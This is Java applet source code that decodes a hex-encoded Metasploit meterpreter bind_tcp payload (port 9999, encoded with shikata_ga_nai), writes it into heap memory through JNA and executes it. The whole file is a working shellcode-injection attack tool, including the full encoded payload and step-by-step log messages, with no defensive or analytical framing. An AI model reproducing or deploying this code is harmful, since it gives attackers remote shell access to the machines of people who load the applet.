
// javac -target 1.1 -source 1.2 -cp "/path/to/jna.jar" runMSFpayload.java
//
 
 
import java.applet.Applet;
import com.sun.jna.Native;
import com.sun.jna.Memory;
import com.sun.jna.Function;
 
 
public class runMSFpayload extends Applet implements Runnable   {
 
  //  msfpayload windows/meterpreter/bind_tcp LPORT=9999 R  | msfencode -c 10 -e x86/shikata_ga_nai -t c -b "\x00"
  public String shellcode_hex="da cb be 54 fd 10 3b d9 74 24 f4 5f 29 c9 b1 88 83 c7 04 31 77 14 03 77 40 1f e5 e1 a8 62 0e a7 ff 7b d6 b3 db 77 b7 08 ea c9 c9 5e 82 30 49 66 5e 40 23 72 b4 02 b7 5e 7b 59 50 c1 e0 fd 61 ff 47 44 08 08 b3 86 e8 a8 37 cb d5 33 74 29 20 3d 5a 92 c4 d3 7e 99 39 7e 1b 54 36 9c e5 f8 4b 6a fe 92 83 1b 1b e4 3d 53 6d 2f 3c 85 ac 43 d4 76 fa ed 2d b0 41 5c 6c 2d ae 38 73 79 d7 a1 83 bc c2 1f 52 a7 30 46 01 82 11 31 2d bc 30 82 30 f8 f5 2b 90 a7 94 7d ff 7b 23 e6 f4 44 22 21 f6 02 29 4c ad 24 44 7d 3a 71 0c 35 b1 12 dc 4a 05 f9 5d 57 bb b3 e7 33 0d 3c c7 1f a6 bd 92 18 74 fc 0b 35 7f c7 fb c0 6b fe b5 bf e4 ed 47 81 8e fb eb bc 83 cd 10 b5 2e 75 e1 b7 9e 99 ce b7 5b f2 43 96 e3 b8 0c 0a 80 e3 30 1f d9 cb 3b 1a b9 03 63 b6 56 fb 87 fa 64 dd de 38 79 fa 39 fd 17 bd 0f 2e 7f 8d cb b4 86 ad 05 75 02 8e 72 6c 0f 65 23 8c 95 e8 b4 8e c3 c9 4a 8c f5 3c 56 da 03 f6 38 79 9b ea e8 f3 b1 d7 54 97 3d 36 3a 0f 27 dc 89 7e 70 0a 7e 62 a5 35 e5 c4 61 6d d0 3a d3 28 1d 87 94 1a d3 a7 0c 52 63 86 dd d1 63 9b a5 fe 45 04 3a b4 4b aa b8 ba 46 68 60 25 e5 34 64 fe e3 c9 ed 5f f6 e8 da b9 86 9f 25 db 19 ff 49 bc 34 03 b9 71 d8 2d 7d af cd 28 46 c0 f2 d4 75 86 89 6a ee ef c6 c3 4f f4 77 d6 9a 0c f9 d9 99 ec a4 b9 7d bd 0f 76 79 45 39 57 ca d1 4f 97 c0 e6 1f e8 b0 48 ec 1b 5b af 7d 87 c1 78 e3 3b 0a 85 70 df ca 03 0b f1 af 54 03 75 84 39 46 bf 79 bb c9 8e e2 8b 81 83 b7 e6 8d 3f e4 15 82 14 ad 3b a1 6d bf 9d 48 b3 d6 17 05 30 4e 4c b7 6d bb 87 48 16 32 a7 fd 5c 3b 04 d7 8c 73 7e 23 02 4b 30 a8 1c 32 d7 60 42 3d 62 0d 20 21 a3 a9 ba 8d 54 67 f7 d1 eb 17 f6 38 dd fe 5f 93 a4 9a 77 5b 47 9d 29 14 01 81 dd 47 a0 22 64 6c 07 7a 14 0f a5 3b a1 62 13 9a c9 a4 65 62 dc a6 63 6a 20 ff 69 40 fa d7 a0 71 fb 29 09";
 
 
  public byte[] shellcode;
  public long offset=0;
  public int C_CONVENTION=0;
  public Thread thread;
 
 
  public runMSFpayload(){}
 
 
  public byte[] fromHexString(final String s) {
      String[] v = s.split(" ");
      byte[] arr = new byte[v.length];
      int i = 0;
      for(i=0;i<v.length;i++) {
	  arr[i] =  Integer.decode("0x" + v[i]).byteValue();
      }
      return arr;
  }
 
 
  public void start() {
    if (thread == null){
	    thread = new Thread(this, "runMSFpayload");
            thread.start();
    }
  }
 
 
  public void stop() {
      thread.stop();
      thread = null;
  }
 
 
  public void run() {
    System.err.println("[Shellcode Injection in JAVA VM with an applet and JNA]");
 
 
    try {
	System.err.println("[+] converting hex shellcode to byte array : "+shellcode_hex);
	shellcode=fromHexString(shellcode_hex);
 
	System.err.println("[+] allocating  "+shellcode.length+ "bytes in heap");
	Memory m=new Memory(shellcode.length);
 
 
	System.err.println("[+] clearing allocated heap");
	m.clear(shellcode.length);
 
	System.err.println("[+] writing shellcode in allocated heap : "+m.toString());
	m.write(offset,shellcode,0,shellcode.length);
 
	System.err.println("[+] getting shellcode pointer");
	Function f=Function.getFunction(m,C_CONVENTION);
 
	System.err.println("[+] executing shellcode : "+shellcode_hex);
	f.invoke(null);
 
    } catch (Exception e){
	System.err.println("[-] error executing code : "+e.getMessage()+"\n");
	e.printStackTrace();
    }
  }
}
